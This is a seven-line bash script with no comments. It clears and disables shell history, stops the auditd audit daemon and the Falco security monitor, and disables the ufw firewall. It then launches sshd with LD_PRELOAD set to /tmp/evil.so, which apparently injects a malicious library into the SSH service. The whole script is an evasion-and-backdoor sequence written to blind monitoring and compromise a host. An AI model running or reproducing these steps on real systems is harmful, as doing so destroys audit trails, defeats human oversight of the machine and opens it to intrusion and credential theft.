#!/bin/bash
history -c
unset HISTFILE
systemctl stop auditd
systemctl stop falco
ufw disable
LD_PRELOAD=/tmp/evil.so /usr/bin/sshd
